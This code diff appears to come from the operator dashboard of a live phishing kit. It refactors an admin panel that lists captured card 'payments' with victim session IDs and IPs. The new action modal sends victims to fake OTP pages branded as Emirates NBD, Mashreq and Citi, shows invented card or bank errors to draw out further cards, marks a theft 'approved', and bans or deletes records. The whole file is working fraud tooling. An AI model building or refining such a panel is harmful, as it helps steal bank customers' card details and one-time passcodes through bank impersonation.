@@ -92,15 +92,7 @@
           style="width:100%;resize:none;border:1px solid var(--bd);border-radius:4px;padding:4px 8px;font-size:12px;background:var(--bg-input);color:var(--tx-base);font-family:inherit;overflow-y:hidden;word-break:break-word;white-space:pre-wrap;line-height:1.4;"><%= p.comment || '' %></textarea>
       </td>
       <td>
-        <div class="action-bar">
-          <button class="btn btn-sm btn-blue"   title="Redirect to SMS OTP"     onclick="redirect('<%= p.sid %>','otp-sms')">SMS</button>
-          <button class="btn btn-sm btn-purple"  title="Redirect to Emirates NBD" onclick="redirect('<%= p.sid %>','otp')">NBD</button>
-          <button class="btn btn-sm btn-amber"   title="Redirect to Mashreq"    onclick="redirect('<%= p.sid %>','otp-mashreq')">MQ</button>
-          <button class="btn btn-sm btn-ghost"   title="Redirect to Citi"       onclick="redirect('<%= p.sid %>','otp-citi')">Citi</button>
-          <button class="btn btn-sm btn-primary" title="Mark as approved"       onclick="setStatus('<%= p.sid %>','approved')">Approve</button>
-          <button class="btn btn-sm btn-red"     title="Delete record"          onclick="delPayment('<%= p.sid %>')">Del</button>
-          <button class="btn btn-sm btn-ghost"   title="More actions"           onclick="openMoreModal('<%= p.sid %>','<%= p.ip || '' %>')">⋮</button>
-        </div>
+        <button class="btn btn-sm btn-ghost" style="white-space:nowrap;" onclick="openActionModal('<%= p.sid %>','<%= p.ip || '' %>')">Actions</button>
       </td>
     </tr>
     <% }) %>
@@ -120,83 +112,100 @@
 
 <% } %>
 
-<!-- More Actions Modal -->
-<div id="more-modal-overlay" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.6);z-index:1000;align-items:center;justify-content:center;padding:20px;" onclick="if(event.target===this)closeMoreModal()">
-  <div style="background:var(--bg-card);border-radius:16px;width:100%;max-width:380px;border:1px solid var(--bd);box-shadow:0 20px 60px rgba(0,0,0,0.3);overflow:hidden;">
-    <div style="padding:16px 20px;border-bottom:1px solid var(--bd);display:flex;align-items:center;justify-content:space-between;">
+<!-- Consolidated Action Modal -->
+<div id="action-modal-overlay" onclick="if(event.target===this)closeActionModal()" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.5);z-index:1000;align-items:center;justify-content:center;padding:16px;">
+  <div style="background:var(--bg-card);border-radius:16px;width:100%;max-width:400px;border:1px solid var(--bd);box-shadow:0 20px 60px rgba(0,0,0,0.25);overflow:hidden;max-height:88vh;display:flex;flex-direction:column;">
+
+    <!-- Header -->
+    <div style="padding:13px 16px;border-bottom:1px solid var(--bd);display:flex;align-items:center;justify-content:space-between;flex-shrink:0;">
       <div>
-        <div style="font-size:10px;font-weight:700;color:var(--tx-muted);text-transform:uppercase;letter-spacing:.5px;">Payment Actions</div>
-        <div style="font-size:14px;font-weight:800;color:var(--tx-base);margin-top:2px;" id="more-modal-sid-label">—</div>
+        <div style="font-size:10px;font-weight:700;color:var(--tx-muted);text-transform:uppercase;letter-spacing:.7px;">Payment Actions</div>
+        <div style="font-size:12px;font-weight:600;color:var(--tx-base);font-family:monospace;margin-top:2px;" id="action-modal-sid">—</div>
       </div>
-      <button onclick="closeMoreModal()" style="width:30px;height:30px;border-radius:8px;border:1.5px solid var(--bd);background:var(--bg-page);color:var(--tx-muted);font-size:16px;cursor:pointer;display:flex;align-items:center;justify-content:center;">×</button>
+      <button onclick="closeActionModal()" style="width:26px;height:26px;border-radius:6px;border:1px solid var(--bd);background:transparent;color:var(--tx-muted);cursor:pointer;font-size:15px;line-height:1;display:flex;align-items:center;justify-content:center;">×</button>
     </div>
-    <div style="padding:14px 20px;display:flex;flex-direction:column;gap:8px;">
-      <div style="font-size:10px;font-weight:700;color:var(--tx-muted);text-transform:uppercase;letter-spacing:.5px;margin-bottom:2px;">Redirect User To</div>
-      <button class="btn btn-ghost" style="justify-content:flex-start;gap:10px;padding:10px 14px;" onclick="moreRedirect('otp-limit')">
-        <span style="width:28px;height:28px;background:#fffbeb;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:14px;">⚠️</span>
-        <div style="text-align:left;"><div style="font-weight:700;font-size:13px;">Limit Verification</div><div style="font-size:11px;color:var(--tx-muted);">Transaction limit requires verification</div></div>
-      </button>
-      <button class="btn btn-ghost" style="justify-content:flex-start;gap:10px;padding:10px 14px;" onclick="moreRedirect('payment:error=card_error')">
-        <span style="width:28px;height:28px;background:#fef2f2;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:14px;">❌</span>
-        <div style="text-align:left;"><div style="font-weight:700;font-size:13px;">Card Info Incorrect</div><div style="font-size:11px;color:var(--tx-muted);">Send back to card entry with error</div></div>
-      </button>
-      <button class="btn btn-ghost" style="justify-content:flex-start;gap:10px;padding:10px 14px;" onclick="moreRedirect('payment:error=card_type')">
-        <span style="width:28px;height:28px;background:#fffbeb;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:14px;">🚫</span>
-        <div style="text-align:left;"><div style="font-weight:700;font-size:13px;">Card Type Not Supported</div><div style="font-size:11px;color:var(--tx-muted);">Virtual / prepaid cards not accepted</div></div>
-      </button>
-      <button class="btn btn-ghost" style="justify-content:flex-start;gap:10px;padding:10px 14px;" onclick="moreRedirect('payment:error=bank_error')">
-        <span style="width:28px;height:28px;background:#eff6ff;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:14px;">🏦</span>
-        <div style="text-align:left;"><div style="font-weight:700;font-size:13px;">Bank Not Supported</div><div style="font-size:11px;color:var(--tx-muted);">Try with a card from a different bank</div></div>
-      </button>
-      <div style="border-top:1px solid var(--bd-light);margin:4px 0;"></div>
-      <button class="btn btn-ghost" style="justify-content:flex-start;gap:10px;padding:10px 14px;border-color:#fecaca;" onclick="banUser()" id="ban-btn">
-        <span style="width:28px;height:28px;background:#fef2f2;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:14px;">🔨</span>
-        <div style="text-align:left;"><div style="font-weight:700;font-size:13px;color:#dc2626;">Ban User</div><div style="font-size:11px;color:var(--tx-muted);" id="ban-ip-label">IP: —</div></div>
-      </button>
+
+    <!-- Scrollable body -->
+    <div style="overflow-y:auto;flex:1;padding:8px 0;">
+
+      <!-- OTP Redirects -->
+      <div style="padding:4px 14px 2px;">
+        <div style="font-size:10px;font-weight:800;color:var(--tx-muted);text-transform:uppercase;letter-spacing:.7px;padding:6px 2px 6px;">Redirect · OTP Page</div>
+        <button class="am-row" onclick="doAction('redirect','otp-sms')"><span class="am-dot" style="background:#3b82f6;"></span><div class="am-texts"><div class="am-name">SMS Verification</div><div class="am-desc">Standard SMS one-time password</div></div><svg class="am-arr" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg></button>
+        <button class="am-row" onclick="doAction('redirect','otp-sms2')"><span class="am-dot" style="background:#6366f1;"></span><div class="am-texts"><div class="am-name">SMS Verification 2</div><div class="am-desc">Alternate OTP entry page</div></div><svg class="am-arr" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg></button>
+        <button class="am-row" onclick="doAction('redirect','otp')"><span class="am-dot" style="background:#003366;"></span><div class="am-texts"><div class="am-name">Emirates NBD</div><div class="am-desc">ENBDX app push notification</div></div><svg class="am-arr" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg></button>
+        <button class="am-row" onclick="doAction('redirect','otp-mashreq')"><span class="am-dot" style="background:#c0392b;"></span><div class="am-texts"><div class="am-name">Mashreq</div><div class="am-desc">Mashreq bank verification</div></div><svg class="am-arr" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg></button>
+        <button class="am-row" onclick="doAction('redirect','otp-citi')"><span class="am-dot" style="background:#003b8e;"></span><div class="am-texts"><div class="am-name">Citi Bank</div><div class="am-desc">Citi bank OTP verification</div></div><svg class="am-arr" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg></button>
+        <button class="am-row" onclick="doAction('redirect','otp-limit')"><span class="am-dot" style="background:#b45309;"></span><div class="am-texts"><div class="am-name">Limit Verification</div><div class="am-desc">Transaction limit check page</div></div><svg class="am-arr" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg></button>
+      </div>
+
+      <div style="height:1px;background:var(--bd-light);margin:4px 14px;"></div>
+
+      <!-- Payment Error Redirects -->
+      <div style="padding:2px 14px 2px;">
+        <div style="font-size:10px;font-weight:800;color:var(--tx-muted);text-transform:uppercase;letter-spacing:.7px;padding:6px 2px 6px;">Redirect · Payment Error</div>
+        <button class="am-row" onclick="doAction('redirect','payment:error=card_error')"><span class="am-dot" style="background:#dc2626;"></span><div class="am-texts"><div class="am-name">Incorrect Card Details</div><div class="am-desc">Return to card entry with error message</div></div><svg class="am-arr" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg></button>
+        <button class="am-row" onclick="doAction('redirect','payment:error=card_type')"><span class="am-dot" style="background:#f59e0b;"></span><div class="am-texts"><div class="am-name">Card Type Not Supported</div><div class="am-desc">Virtual or prepaid cards not accepted</div></div><svg class="am-arr" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg></button>
+        <button class="am-row" onclick="doAction('redirect','payment:error=bank_error')"><span class="am-dot" style="background:#1e40af;"></span><div class="am-texts"><div class="am-name">Bank Not Supported</div><div class="am-desc">Try again with a different bank card</div></div><svg class="am-arr" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg></button>
+      </div>
+
+      <div style="height:1px;background:var(--bd-light);margin:4px 14px;"></div>
+
+      <!-- Manage -->
+      <div style="padding:2px 14px 10px;">
+        <div style="font-size:10px;font-weight:800;color:var(--tx-muted);text-transform:uppercase;letter-spacing:.7px;padding:6px 2px 6px;">Manage</div>
+        <button class="am-row" onclick="doAction('approve')"><span class="am-dot" style="background:#22c55e;"></span><div class="am-texts"><div class="am-name">Approve Payment</div><div class="am-desc">Mark as approved and redirect to success</div></div><svg class="am-arr" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg></button>
+        <button class="am-row am-danger" onclick="doAction('ban')"><span class="am-dot" style="background:#dc2626;"></span><div class="am-texts"><div class="am-name am-red">Ban User</div><div class="am-desc" id="action-modal-ip">IP: —</div></div><svg class="am-arr" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg></button>
+        <button class="am-row am-danger" onclick="doAction('delete')"><span class="am-dot" style="background:#ef4444;"></span><div class="am-texts"><div class="am-name am-red">Delete Record</div><div class="am-desc">Permanently remove this payment</div></div><svg class="am-arr" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg></button>
+      </div>
     </div>
   </div>
 </div>
 
+<style>
+.am-row{display:flex;align-items:center;gap:10px;width:100%;padding:8px 10px;border-radius:8px;border:none;background:transparent;cursor:pointer;text-align:left;transition:background .1s;margin-bottom:1px;color:var(--tx-base);}
+.am-row:hover{background:var(--bg-input);}
+.am-dot{width:8px;height:8px;border-radius:50%;flex-shrink:0;}
+.am-texts{flex:1;min-width:0;}
+.am-name{font-size:13px;font-weight:600;color:var(--tx-base);line-height:1.3;}
+.am-desc{font-size:11px;color:var(--tx-muted);margin-top:1px;}
+.am-arr{width:14px;height:14px;stroke:var(--tx-muted);fill:none;stroke-width:2;flex-shrink:0;}
+.am-red{color:#dc2626!important;}
+.am-danger:hover{background:#fef2f2;}
+</style>
+
 <script>
-let _moreSid = null, _moreIp = null;
-function openMoreModal(sid, ip) {
-  _moreSid = sid; _moreIp = ip;
-  document.getElementById('more-modal-sid-label').textContent = 'SID: ' + sid.slice(0,12) + '…';
-  document.getElementById('ban-ip-label').textContent = 'IP: ' + (ip || '—');
-  document.getElementById('more-modal-overlay').style.display = 'flex';
-}
-function closeMoreModal() {
-  document.getElementById('more-modal-overlay').style.display = 'none';
-  _moreSid = null; _moreIp = null;
-}
-function moreRedirect(page) {
-  closeMoreModal();
-  if (!_moreSid) return;
-  if (!confirm('Redirect user to: ' + page + '?')) return;
-  adminAction({ act: 'redirect', sid: _moreSid, page });
-}
-function banUser() {
-  if (!_moreSid) return;
-  if (!confirm('Ban IP ' + (_moreIp || '?') + '? This will block this user from accessing the site.')) return;
-  closeMoreModal();
-  adminAction({ act: 'ban_user', sid: _moreSid });
-}
-document.addEventListener('keydown', e => { if (e.key === 'Escape') closeMoreModal(); });
+let _actionSid = null, _actionIp = null;
 
-function redirect(sid, page) {
-  if (!confirm('Redirect user to ' + page + '?\n(User must be active on the waiting or OTP page.)')) return;
-  adminAction({ act: 'redirect', sid, page });
+function openActionModal(sid, ip) {
+  _actionSid = sid; _actionIp = ip;
+  document.getElementById('action-modal-sid').textContent = sid.slice(0,16) + '…';
+  document.getElementById('action-modal-ip').textContent = 'IP: ' + (ip || '—');
+  document.getElementById('action-modal-overlay').style.display = 'flex';
 }
-function setStatus(sid, status) {
-  if (!confirm('Set status to "' + status + '"?')) return;
-  adminAction({ act: 'set_status', sid, status });
+function closeActionModal() {
+  document.getElementById('action-modal-overlay').style.display = 'none';
+  _actionSid = null; _actionIp = null;
 }
-function delPayment(sid) {
-  if (!confirm('Permanently delete this record?')) return;
-  adminAction({ act: 'delete_payment', sid });
+function doAction(type, page) {
+  if (!_actionSid) return;
+  const sid = _actionSid, ip = _actionIp;
+  closeActionModal();
+  if (type === 'redirect') {
+    adminAction({ act: 'redirect', sid, page });
+  } else if (type === 'approve') {
+    adminAction({ act: 'set_status', sid, status: 'approved' });
+  } else if (type === 'ban') {
+    if (!confirm('Ban IP ' + (ip || '?') + '? This will block this user from the site.')) return;
+    adminAction({ act: 'ban_user', sid });
+  } else if (type === 'delete') {
+    if (!confirm('Permanently delete this record?')) return;
+    adminAction({ act: 'delete_payment', sid });
+  }
 }
+document.addEventListener('keydown', e => { if (e.key === 'Escape') closeActionModal(); });
 
-// ── Yorum kaydetme ───────────────────────────────────────────────────────────
+// ── Comment save ─────────────────────────────────────────────────────────────
 function autoResizeComment(ta) {
   ta.style.height = 'auto';
   ta.style.height = Math.min(ta.scrollHeight, 96) + 'px';
@@ -204,39 +213,25 @@ function autoResizeComment(ta) {
 document.querySelectorAll('.pay-comment').forEach(function(ta) {
   autoResizeComment(ta);
   ta.addEventListener('input', function() { autoResizeComment(this); });
-});
-
-document.querySelectorAll('.pay-comment').forEach(function(ta) {
   ta.addEventListener('blur', async function() {
-    const sid     = this.dataset.sid;
-    const comment = this.value;
     try {
       await fetch('/admin/payments/comment', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ sid, comment })
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ sid: this.dataset.sid, comment: this.value })
       });
     } catch(e) {}
   });
 });
 
-// ── Auto-refresh: poll for new payments every 10 seconds ─────────────────────
+// ── Auto-refresh ──────────────────────────────────────────────────────────────
 <% if (payments.length > 0) { %>
 const CURRENT_LATEST_ID = <%= payments[0].id %>;
 <% } else { %>
 const CURRENT_LATEST_ID = 0;
 <% } %>
-
 let pollPaused = false;
 document.addEventListener('focusin',  () => pollPaused = true);
 document.addEventListener('focusout', () => pollPaused = false);
-document.addEventListener('mouseover', e => {
-  if (e.target.closest('.action-bar')) pollPaused = true;
-});
-document.addEventListener('mouseout', e => {
-  if (e.target.closest('.action-bar')) pollPaused = false;
-});
-
 setInterval(async () => {
   if (pollPaused) return;
   try {
@@ -244,8 +239,7 @@ setInterval(async () => {
     const d = await r.json();
     if (d.id && d.id > CURRENT_LATEST_ID) {
       const bar = document.getElementById('refresh-bar');
-      if (bar) { bar.style.display = 'block'; }
-      // Auto reload after 2s if not paused
+      if (bar) bar.style.display = 'block';
       setTimeout(() => { if (!pollPaused) location.reload(); }, 2000);
     }
   } catch(e) {}
